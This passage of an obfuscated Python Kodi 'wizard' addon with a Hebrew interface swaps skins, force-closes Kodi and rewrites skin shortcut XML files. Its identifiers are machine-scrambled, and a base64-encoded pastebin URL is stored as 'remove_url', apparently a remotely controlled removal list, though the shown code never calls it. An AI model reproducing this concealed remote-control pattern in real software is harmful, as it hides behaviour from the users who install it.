# coding: utf-8
import xbmc ,xbmcaddon ,xbmcgui ,xbmcplugin ,os ,sys ,xbmcvfs ,glob ,random #line:21
import shutil ,logging #line:22
import urllib2 ,urllib #line:23
import re ,time #line:24
import subprocess #line:25
import json #line:26
import zipfile #line:27
import uservar #line:28
import speedtest #line:29
import fnmatch #line:30
from shutil import copyfile #line:31
try :from sqlite3 import dbapi2 as database #line:32
except :from pysqlite2 import dbapi2 as database #line:33
from threading import Thread #line:34
from datetime import date ,datetime ,timedelta #line:35
from urlparse import urljoin #line:36
from resources .libs import extract ,downloader ,downloaderbg ,notify ,debridit ,traktit ,resloginit ,loginit ,skinSwitch ,uploadLog ,yt ,wizard as wiz #line:37
ADDON_ID =uservar .ADDON_ID #line:40
ADDONTITLE =uservar .ADDONTITLE #line:41
ADDON =wiz .addonId (ADDON_ID )#line:42
VERSION =wiz .addonInfo (ADDON_ID ,'version')#line:43
ADDONPATH =wiz .addonInfo (ADDON_ID ,'path')#line:44
DIALOG =xbmcgui .Dialog ()#line:45
DP =xbmcgui .DialogProgress ()#line:46
HOME =xbmc .translatePath ('special://home/')#line:47
LOG =xbmc .translatePath ('special://logpath/')#line:48
PROFILE =xbmc .translatePath ('special://profile/')#line:49
ADDONS =os .path .join (HOME ,'addons')#line:50
USERDATA =os .path .join (HOME ,'userdata')#line:51
PLUGIN =os .path .join (ADDONS ,ADDON_ID )#line:52
PACKAGES =os .path .join (ADDONS ,'packages')#line:53
ADDOND =os .path .join (USERDATA ,'addon_data')#line:54
ADDONDATA =os .path .join (USERDATA ,'addon_data',ADDON_ID )#line:55
ADVANCED =os .path .join (USERDATA ,'advancedsettings.xml')#line:56
SOURCES =os .path .join (USERDATA ,'sources.xml')#line:57
FAVOURITES =os .path .join (USERDATA ,'favourites.xml')#line:58
PROFILES =os .path .join (USERDATA ,'profiles.xml')#line:59
GUISETTINGS =os .path .join (USERDATA ,'guisettings.xml')#line:60
THUMBS =os .path .join (USERDATA ,'Thumbnails')#line:61
DATABASE =os .path .join (USERDATA ,'Database')#line:62
FANART =os .path .join (ADDONPATH ,'fanart.jpg')#line:63
ICON =os .path .join (ADDONPATH ,'icon.png')#line:64
ART =os .path .join (ADDONPATH ,'resources','art')#line:65
WIZLOG =os .path .join (ADDONDATA ,'wizard.log')#line:66
SKIN =xbmc .getSkinDir ()#line:68
BUILDNAME =wiz .getS ('buildname')#line:69
DEFAULTSKIN =wiz .getS ('defaultskin')#line:70
DEFAULTNAME =wiz .getS ('defaultskinname')#line:71
DEFAULTIGNORE =wiz .getS ('defaultskinignore')#line:72
BUILDVERSION =wiz .getS ('buildversion')#line:73
BUILDTHEME =wiz .getS ('buildtheme')#line:74
BUILDLATEST =wiz .getS ('latestversion')#line:75
INSTALLMETHOD =wiz .getS ('installmethod')#line:76
SHOW15 =wiz .getS ('show15')#line:77
SHOW16 =wiz .getS ('show16')#line:78
SHOW17 =wiz .getS ('show17')#line:79
SHOW18 =wiz .getS ('show18')#line:80
SHOWADULT =wiz .getS ('adult')#line:81
SHOWMAINT =wiz .getS ('showmaint')#line:82
AUTOCLEANUP =wiz .getS ('autoclean')#line:83
AUTOCACHE =wiz .getS ('clearcache')#line:84
AUTOPACKAGES =wiz .getS ('clearpackages')#line:85
AUTOTHUMBS =wiz .getS ('clearthumbs')#line:86
AUTOFEQ =wiz .getS ('autocleanfeq')#line:87
AUTONEXTRUN =wiz .getS ('nextautocleanup')#line:88
INCLUDENAN =wiz .getS ('includenan')#line:89
INCLUDEURL =wiz .getS ('includeurl')#line:90
INCLUDEBOBUNLEASHED =wiz .getS ('includebobunleashed')#line:91
INCLUDEELYSIUM =wiz .getS ('includeelysium')#line:92
INCLUDECOVENANT =wiz .getS ('includecovenant')#line:93
INCLUDEVIDEO =wiz .getS ('includevideo')#line:94
INCLUDEALL =wiz .getS ('includeall')#line:95
INCLUDEBOB =wiz .getS ('includebob')#line:96
INCLUDEPHOENIX =wiz .getS ('includephoenix')#line:97
INCLUDESPECTO =wiz .getS ('includespecto')#line:98
INCLUDEGENESIS =wiz .getS ('includegenesis')#line:99
INCLUDEEXODUS =wiz .getS ('includeexodus')#line:100
INCLUDEONECHAN =wiz .getS ('includeonechan')#line:101
INCLUDESALTS =wiz .getS ('includesalts')#line:102
INCLUDESALTSHD =wiz .getS ('includesaltslite')#line:103
INCLUDERESOLVE =wiz .getS ('includeresolve')#line:104
INCLUDEPLACENTA =wiz .getS ('includeplacenta')#line:105
INCLUDENEPTUNE =wiz .getS ('includeneptune')#line:106
INCLUDEGENESISREBORN =wiz .getS ('includegenesisreborn')#line:107
INCLUDEFLIXNET =wiz .getS ('includeflixnet')#line:108
INCLUDEURANUS =wiz .getS ('includeuranus')#line:109
SEPERATE =wiz .getS ('seperate')#line:110
NOTIFY =wiz .getS ('notify')#line:111
NOTEDISMISS =wiz .getS ('notedismiss')#line:112
NOTEID =wiz .getS ('noteid')#line:113
NOTIFY2 =wiz .getS ('notify2')#line:114
NOTEID2 =wiz .getS ('noteid2')#line:115
NOTEDISMISS2 =wiz .getS ('notedismiss2')#line:116
NOTIFY3 =wiz .getS ('notify3')#line:117
NOTEID3 =wiz .getS ('noteid3')#line:118
NOTEDISMISS3 =wiz .getS ('notedismiss3')#line:119
NOTEID =0 if NOTEID ==""else int (NOTEID )#line:120
TRAKTSAVE =wiz .getS ('traktlastsave')#line:121
REALSAVE =wiz .getS ('debridlastsave')#line:122
LOGINSAVE =wiz .getS ('loginlastsave')#line:123
KEEPMOVIEWALL =wiz .getS ('keepmoviewall')#line:124
KEEPMOVIELIST =wiz .getS ('keepmovielist')#line:125
KEEPINFO =wiz .getS ('keepinfo')#line:126
KEEPSOUND =wiz .getS ('keepsound')#line:128
KEEPVIEW =wiz .getS ('keepview')#line:129
KEEPSKIN =wiz .getS ('keepskin')#line:130
KEEPADDONS =wiz .getS ('keepaddons')#line:131
KEEPSKIN2 =wiz .getS ('keepskin2')#line:132
KEEPSKIN3 =wiz .getS ('keepskin3')#line:133
KEEPTORNET =wiz .getS ('keeptornet')#line:134
KEEPPLAYLIST =wiz .getS ('keepplaylist')#line:135
KEEPPVR =wiz .getS ('keeppvr')#line:136
ENABLE =uservar .ENABLE #line:137
KEEPTVLIST =wiz .getS ('keeptvlist')#line:139
KEEPHUBMOVIE =wiz .getS ('keephubmovie')#line:140
KEEPHUBTVSHOW =wiz .getS ('keephubtvshow')#line:141
KEEPHUBTV =wiz .getS ('keephubtv')#line:142
KEEPHUBVOD =wiz .getS ('keephubvod')#line:143
KEEPHUBKIDS =wiz .getS ('keephubkids')#line:144
KEEPHUBMUSIC =wiz .getS ('keephubmusic')#line:145
KEEPHUBMENU =wiz .getS ('keephubmenu')#line:146
HARDWAER =wiz .getS ('action')#line:148
USERNAME =wiz .getS ('user')#line:149
PASSWORD =wiz .getS ('pass')#line:150
KEEPFAVS =wiz .getS ('keepfavourites')#line:152
KEEPSOURCES =wiz .getS ('keepsources')#line:153
KEEPPROFILES =wiz .getS ('keepprofiles')#line:154
KEEPADVANCED =wiz .getS ('keepadvanced')#line:155
KEEPREPOS =wiz .getS ('keeprepos')#line:156
KEEPSUPER =wiz .getS ('keepsuper')#line:157
KEEPWHITELIST =wiz .getS ('keepwhitelist')#line:158
KEEPTRAKT =wiz .getS ('keeptrakt')#line:159
KEEPREAL =wiz .getS ('keepdebrid')#line:160
KEEPRD2 =wiz .getS ('keeprd2')#line:161
KEEPLOGIN =wiz .getS ('keeplogin')#line:162
LOGINSAVE =wiz .getS ('loginlastsave')#line:163
DEVELOPER =wiz .getS ('developer')#line:164
THIRDPARTY =wiz .getS ('enable3rd')#line:165
THIRD1NAME =wiz .getS ('wizard1name')#line:166
THIRD1URL =wiz .getS ('wizard1url')#line:167
THIRD2NAME =wiz .getS ('wizard2name')#line:168
THIRD2URL =wiz .getS ('wizard2url')#line:169
THIRD3NAME =wiz .getS ('wizard3name')#line:170
THIRD3URL =wiz .getS ('wizard3url')#line:171
BACKUPLOCATION =ADDON .getSetting ('path')if not ADDON .getSetting ('path')==''else 'special://home/'#line:172
MYBUILDS =os .path .join (BACKUPLOCATION ,'My_Builds','')#line:173
AUTOFEQ =int (float (AUTOFEQ ))if AUTOFEQ .isdigit ()else 3 #line:174
TODAY =date .today ()#line:175
TOMORROW =TODAY +timedelta (days =1 )#line:176
THREEDAYS =TODAY +timedelta (days =3 )#line:177
KODIV =float (xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:178
MCNAME =wiz .mediaCenter ()#line:179
EXCLUDES =uservar .EXCLUDES #line:180
SPEEDFILE =speedtest .SPEEDFILE #line:181
APKFILE =uservar .APKFILE #line:182
YOUTUBETITLE =uservar .YOUTUBETITLE #line:183
YOUTUBEFILE =uservar .YOUTUBEFILE #line:184
SPEED =speedtest .SPEED #line:185
UNAME =speedtest .UNAME #line:186
ADDONFILE =uservar .ADDONFILE #line:187
ADVANCEDFILE =uservar .ADVANCEDFILE #line:188
UPDATECHECK =uservar .UPDATECHECK if str (uservar .UPDATECHECK ).isdigit ()else 1 #line:189
NEXTCHECK =TODAY +timedelta (days =UPDATECHECK )#line:190
NOTIFICATION =uservar .NOTIFICATION #line:191
NOTIFICATION2 =uservar .NOTIFICATION2 #line:192
NOTIFICATION3 =uservar .NOTIFICATION3 #line:193
HELPINFO =uservar .HELPINFO #line:194
ENABLE =uservar .ENABLE #line:195
HEADERMESSAGE =uservar .HEADERMESSAGE #line:196
AUTOUPDATE =uservar .AUTOUPDATE #line:197
WIZARDFILE =uservar .WIZARDFILE #line:198
HIDECONTACT =uservar .HIDECONTACT #line:199
SKINID18 =uservar .SKINID18 #line:200
SKINID18DDONXML =uservar .SKINID18DDONXML #line:201
SKIN18ZIPURL =uservar .SKIN18ZIPURL #line:202
SKINID17 =uservar .SKINID17 #line:203
SKINID17DDONXML =uservar .SKINID17DDONXML #line:204
SKIN17ZIPURL =uservar .SKIN17ZIPURL #line:205
NEWFASTUPDATE =uservar .NEWFASTUPDATE #line:206
CONTACT =uservar .CONTACT #line:207
CONTACTICON =uservar .CONTACTICON if not uservar .CONTACTICON =='http://'else ICON #line:208
CONTACTFANART =uservar .CONTACTFANART if not uservar .CONTACTFANART =='http://'else FANART #line:209
HIDESPACERS =uservar .HIDESPACERS #line:210
TMDB_NEW_API =uservar .TMDB_NEW_API #line:211
COLOR1 =uservar .COLOR1 #line:212
COLOR2 =uservar .COLOR2 #line:213
THEME1 =uservar .THEME1 #line:214
THEME2 =uservar .THEME2 #line:215
THEME3 =uservar .THEME3 #line:216
THEME4 =uservar .THEME4 #line:217
THEME5 =uservar .THEME5 #line:218
ICONBUILDS =uservar .ICONBUILDS if not uservar .ICONBUILDS =='http://'else ICON #line:219
ICONMAINT =uservar .ICONMAINT if not uservar .ICONMAINT =='http://'else ICON #line:220
ICONAPK =uservar .ICONAPK if not uservar .ICONAPK =='http://'else ICON #line:221
ICONADDONS =uservar .ICONADDONS if not uservar .ICONADDONS =='http://'else ICON #line:222
ICONYOUTUBE =uservar .ICONYOUTUBE if not uservar .ICONYOUTUBE =='http://'else ICON #line:223
ICONSAVE =uservar .ICONSAVE if not uservar .ICONSAVE =='http://'else ICON #line:224
ICONTRAKT =uservar .ICONTRAKT if not uservar .ICONTRAKT =='http://'else ICON #line:225
ICONREAL =uservar .ICONREAL if not uservar .ICONREAL =='http://'else ICON #line:226
ICONLOGIN =uservar .ICONLOGIN if not uservar .ICONLOGIN =='http://'else ICON #line:227
ICONCONTACT =uservar .ICONCONTACT if not uservar .ICONCONTACT =='http://'else ICON #line:228
ICONSETTINGS =uservar .ICONSETTINGS if not uservar .ICONSETTINGS =='http://'else ICON #line:229
LOGFILES =wiz .LOGFILES #line:230
TRAKTID =traktit .TRAKTID #line:231
DEBRIDID =debridit .DEBRIDID #line:232
LOGINID =loginit .LOGINID #line:233
MODURL ='http://tribeca.tvaddons.ag/tools/maintenance/modules/'#line:234
MODURL2 ='http://mirrors.kodi.tv/addons/jarvis/'#line:235
INSTALLMETHODS =['Always Ask','Reload Profile','Force Close']#line:236
DEFAULTPLUGINS =['metadata.album.universal','metadata.artists.universal','metadata.common.fanart.tv','metadata.common.imdb.com','metadata.common.musicbrainz.org','metadata.themoviedb.org','metadata.tvdb.com','service.xbmc.versioncheck']#line:237
fullsecfold =xbmc .translatePath ('special://home')#line:238
addons_folder =os .path .join (fullsecfold ,'addons')#line:240
remove_url ='aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L0N0aTRaSkFh'.decode ('base64')#line:242
user_folder =os .path .join (xbmc .translatePath ('special://masterprofile'),'addon_data')#line:244
remove_url2 ='aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L0N0aTRaSkFh'.decode ('base64')#line:246
fanart =xbmc .translatePath (os .path .join ('special://home/addons/'+ADDON_ID ,'fanart.jpg'))#line:247
icon =xbmc .translatePath (os .path .join ('special://home/addons/'+ADDON_ID ,'icon.png'))#line:248
def MainMenu ():#line:255
	addItem ('Skin Premium','url',5 ,icon ,fanart ,'')#line:257
def skinWIN ():#line:258
	idle ()#line:259
	OO0OO0OOO0O00O000 =glob .glob (os .path .join (ADDONS ,'skin*'))#line:260
	O0OOO0O0O00O0O00O =[];O00O00O0O00OO000O =[]#line:261
	for O0000O000OOOOO0O0 in sorted (OO0OO0OOO0O00O000 ,key =lambda OO0O00OO0OO0O00O0 :OO0O00OO0OO0O00O0 ):#line:262
		O000000O00OO0OO00 =os .path .split (O0000O000OOOOO0O0 [:-1 ])[1 ]#line:263
		OO00000O000OO00OO =os .path .join (O0000O000OOOOO0O0 ,'addon.xml')#line:264
		if os .path .exists (OO00000O000OO00OO ):#line:265
			O000O0O0O0OO0O000 =open (OO00000O000OO00OO )#line:266
			OO00OOOOOOO0OOO00 =O000O0O0O0OO0O000 .read ()#line:267
			O0O0OOOO00O0OO00O =parseDOM2 (OO00OOOOOOO0OOO00 ,'addon',ret ='id')#line:268
			OOO0O00OOOO00O00O =O000000O00OO0OO00 if len (O0O0OOOO00O0OO00O )==0 else O0O0OOOO00O0OO00O [0 ]#line:269
			try :#line:270
				O000OOO0O00000OO0 =xbmcaddon .Addon (id =OOO0O00OOOO00O00O )#line:271
				O0OOO0O0O00O0O00O .append (O000OOO0O00000OO0 .getAddonInfo ('name'))#line:272
				O00O00O0O00OO000O .append (OOO0O00OOOO00O00O )#line:273
			except :#line:274
				pass #line:275
	O0000000OOOOO0O00 =[];OO0OO0000O00O0OO0 =0 #line:276
	OO000OO0OOO0OOO0O =["Current Skin -- %s"%currSkin ()]+O0OOO0O0O00O0O00O #line:277
	OO0OO0000O00O0OO0 =DIALOG .select ("Select the Skin you want to swap with.",OO000OO0OOO0OOO0O )#line:278
	if OO0OO0000O00O0OO0 ==-1 :return #line:279
	else :#line:280
		OO00000OOOOOO000O =(OO0OO0000O00O0OO0 -1 )#line:281
		O0000000OOOOO0O00 .append (OO00000OOOOOO000O )#line:282
		OO000OO0OOO0OOO0O [OO0OO0000O00O0OO0 ]="%s"%(O0OOO0O0O00O0O00O [OO00000OOOOOO000O ])#line:283
	if O0000000OOOOO0O00 ==None :return #line:284
	for O000OOO0OOOOOOOO0 in O0000000OOOOO0O00 :#line:285
		swapSkins (O00O00O0O00OO000O [O000OOO0OOOOOOOO0 ])#line:286
def currSkin ():#line:288
	return xbmc .getSkinDir ('Container.PluginName')#line:289
def swapSkins (OO000O0000OO0OO0O ,title ="Error"):#line:290
	OO0OOO0000O000O00 ='lookandfeel.skin'#line:291
	OO000O0O0000OO000 =OO000O0000OO0OO0O #line:292
	O00O0OOO000O00O0O =getOld (OO0OOO0000O000O00 )#line:293
	OO0OOOOO0OOO0000O =OO0OOO0000O000O00 #line:294
	setNew (OO0OOOOO0OOO0000O ,OO000O0O0000OO000 )#line:295
	OO0OOO00OO0OO0OOO =0 #line:296
	while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and OO0OOO00OO0OO0OOO <100 :#line:297
		OO0OOO00OO0OO0OOO +=1 #line:298
		xbmc .sleep (1 )#line:299
	if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:300
		xbmc .executebuiltin ('SendClick(11)')#line:301
	return True #line:302
def getOld (OOO00OO0OOOO00OO0 ):#line:304
	try :#line:305
		OOO00OO0OOOO00OO0 ='"%s"'%OOO00OO0OOOO00OO0 #line:306
		O0000OO0OO000OOO0 ='{"jsonrpc":"2.0", "method":"Settings.GetSettingValue","params":{"setting":%s}, "id":1}'%(OOO00OO0OOOO00OO0 )#line:307
		O0000O0OOO000OOO0 =xbmc .executeJSONRPC (O0000OO0OO000OOO0 )#line:309
		O0000O0OOO000OOO0 =simplejson .loads (O0000O0OOO000OOO0 )#line:310
		if O0000O0OOO000OOO0 .has_key ('result'):#line:311
			if O0000O0OOO000OOO0 ['result'].has_key ('value'):#line:312
				return O0000O0OOO000OOO0 ['result']['value']#line:313
	except :#line:314
		pass #line:315
	return None #line:316
def setNew (O0000OO0000OO0OOO ,OO0000OO00OOO00OO ):#line:319
	try :#line:320
		O0000OO0000OO0OOO ='"%s"'%O0000OO0000OO0OOO #line:321
		OO0000OO00OOO00OO ='"%s"'%OO0000OO00OOO00OO #line:322
		OOO0OO0OOOO0O00OO ='{"jsonrpc":"2.0", "method":"Settings.SetSettingValue","params":{"setting":%s,"value":%s}, "id":1}'%(O0000OO0000OO0OOO ,OO0000OO00OOO00OO )#line:323
		O00O0OO00OOO0000O =xbmc .executeJSONRPC (OOO0OO0OOOO0O00OO )#line:325
	except :#line:326
		pass #line:327
	return None #line:328
def idle ():#line:329
	return xbmc .executebuiltin ('Dialog.Close(busydialog)')#line:330
def resetkodi ():#line:332
		if xbmc .getCondVisibility ('system.platform.windows'):#line:333
			OOO000O0OOO0O00OO =xbmcgui .DialogProgress ()#line:334
			OOO000O0OOO0O00OO .create ("ההתקנה תסגר והקודי יעלה אוטומטית","אנא המתן 5 שניות",'',"[COLOR orange][B]ברוכים הבאים![/B][/COLOR]")#line:337
			OOO000O0OOO0O00OO .update (0 )#line:338
			for OO00O00OO000O00O0 in range (5 ,-1 ,-1 ):#line:339
				time .sleep (1 )#line:340
				OOO000O0OOO0O00OO .update (int ((5 -OO00O00OO000O00O0 )/5.0 *100 ),"מתבצע הפעלה מחדש לקודי",'בעוד {0} שניות'.format (OO00O00OO000O00O0 ),'')#line:341
				if OOO000O0OOO0O00OO .iscanceled ():#line:342
					from resources .libs import win #line:343
					return None ,None #line:344
			from resources .libs import win #line:345
		else :#line:346
			OOO000O0OOO0O00OO =xbmcgui .DialogProgress ()#line:347
			OOO000O0OOO0O00OO .create ("ההתקנה תסגר אוטומטית","אנא המתן 5 שניות",'',"[COLOR orange][B]ברוכים הבאים![/B][/COLOR]")#line:350
			OOO000O0OOO0O00OO .update (0 )#line:351
			for OO00O00OO000O00O0 in range (5 ,-1 ,-1 ):#line:352
				time .sleep (1 )#line:353
				OOO000O0OOO0O00OO .update (int ((5 -OO00O00OO000O00O0 )/5.0 *100 ),"ההתקנה תסגר",'בעוד {0} שניות'.format (OO00O00OO000O00O0 ),'')#line:354
				if OOO000O0OOO0O00OO .iscanceled ():#line:355
					os ._exit (1 )#line:356
					return None ,None #line:357
			os ._exit (1 )#line:358
def backtokodi ():#line:360
			wiz .kodi17Fix ()#line:361
			fix18update ()#line:362
			fix17update ()#line:363
def testcommand ():#line:364
			indicator ()#line:365
def rdoff ():#line:367
	resloginit .resloginit ('restore','all')#line:369
	O00OOO000OO0OO000 =xbmc .translatePath ('special://home/media')+"/Splashoff.png"#line:370
	O0OO00O0OOOO0OOO0 =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:371
	copyfile (O00OOO000OO0OO000 ,O0OO00O0OOOO0OOO0 )#line:372
def rdon ():#line:374
	loginit .loginIt ('restore','all')#line:375
	OO000OOO000000000 =xbmc .translatePath ('special://home/media')+"/SplashRd.png"#line:377
	O0OO00O0000O00O0O =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:378
	copyfile (OO000OOO000000000 ,O0OO00O0000O00O0O )#line:379
def adults18 ():#line:381
  O000O00O0O0OO0OOO =(ADDON .getSetting ("adults"))#line:382
  if O000O00O0O0OO0OOO =='true':#line:383
    OO0O000OO000OO0O0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:384
    with open (OO0O000OO000OO0O0 ,'r')as O0O00O000OO0OO000 :#line:385
      OOOOOOO0O00OO0OOO =O0O00O000OO0OO000 .read ()#line:386
    OOOOOOO0O00OO0OOO =OOOOOOO0O00OO0OOO .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - 18+</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://skin/extras/icons/sex.png</thumb>
		<action>ActivateWindow(1113)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - 18+</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://skin/extras/icons/sex.png</thumb>
		<action>ActivateWindow(1113)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:404
    with open (OO0O000OO000OO0O0 ,'w')as O0O00O000OO0OO000 :#line:407
      O0O00O000OO0OO000 .write (OOOOOOO0O00OO0OOO )#line:408
def rdbuildaddon ():#line:409
  OO000OOO0000O0000 =(ADDON .getSetting ("rdbuild"))#line:410
  if OO000OOO0000O0000 =='true':#line:411
    OO0O0O000O00OOO0O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:412
    with open (OO0O0O000O00OOO0O ,'r')as OOO0OOO0OOOOOOO0O :#line:413
      O000000OOOOOOO0OO =OOO0OOO0OOOOOOO0O .read ()#line:414
    O000000OOOOOOO0OO =O000000OOOOOOO0OO .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''')#line:432
    with open (OO0O0O000O00OOO0O ,'w')as OOO0OOO0OOOOOOO0O :#line:435
      OOO0OOO0OOOOOOO0O .write (O000000OOOOOOO0OO )#line:436
    OO0O0O000O00OOO0O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:440
    with open (OO0O0O000O00OOO0O ,'r')as OOO0OOO0OOOOOOO0O :#line:441
      O000000OOOOOOO0OO =OOO0OOO0OOOOOOO0O .read ()#line:442
    O000000OOOOOOO0OO =O000000OOOOOOO0OO .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''')#line:460
    with open (OO0O0O000O00OOO0O ,'w')as OOO0OOO0OOOOOOO0O :#line:463
      OOO0OOO0OOOOOOO0O .write (O000000OOOOOOO0OO )#line:464
    OO0O0O000O00OOO0O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:468
    with open (OO0O0O000O00OOO0O ,'r')as OOO0OOO0OOOOOOO0O :#line:469
      O000000OOOOOOO0OO =OOO0OOO0OOOOOOO0O .read ()#line:470
    O000000OOOOOOO0OO =O000000OOOOOOO0OO .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''')#line:488
    with open (OO0O0O000O00OOO0O ,'w')as OOO0OOO0OOOOOOO0O :#line:491
      OOO0OOO0OOOOOOO0O .write (O000000OOOOOOO0OO )#line:492
    OO0O0O000O00OOO0O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:496
    with open (OO0O0O000O00OOO0O ,'r')as OOO0OOO0OOOOOOO0O :#line:497
      O000000OOOOOOO0OO =OOO0OOO0OOOOOOO0O .read ()#line:498
    O000000OOOOOOO0OO =O000000OOOOOOO0OO .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''')#line:516
    with open (OO0O0O000O00OOO0O ,'w')as OOO0OOO0OOOOOOO0O :#line:519
      OOO0OOO0OOOOOOO0O .write (O000000OOOOOOO0OO )#line:520
    OO0O0O000O00OOO0O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:523
    with open (OO0O0O000O00OOO0O ,'r')as OOO0OOO0OOOOOOO0O :#line:524
      O000000OOOOOOO0OO =OOO0OOO0OOOOOOO0O .read ()#line:525
    O000000OOOOOOO0OO =O000000OOOOOOO0OO .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''')#line:543
    with open (OO0O0O000O00OOO0O ,'w')as OOO0OOO0OOOOOOO0O :#line:546
      OOO0OOO0OOOOOOO0O .write (O000000OOOOOOO0OO )#line:547
    OO0O0O000O00OOO0O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:549
    with open (OO0O0O000O00OOO0O ,'r')as OOO0OOO0OOOOOOO0O :#line:550
      O000000OOOOOOO0OO =OOO0OOO0OOOOOOO0O .read ()#line:551
    O000000OOOOOOO0OO =O000000OOOOOOO0OO .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''')#line:569
    with open (OO0O0O000O00OOO0O ,'w')as OOO0OOO0OOOOOOO0O :#line:572
      OOO0OOO0OOOOOOO0O .write (O000000OOOOOOO0OO )#line:573
    OO0O0O000O00OOO0O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:575
    with open (OO0O0O000O00OOO0O ,'r')as OOO0OOO0OOOOOOO0O :#line:576
      O000000OOOOOOO0OO =OOO0OOO0OOOOOOO0O .read ()#line:577
    O000000OOOOOOO0OO =O000000OOOOOOO0OO .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
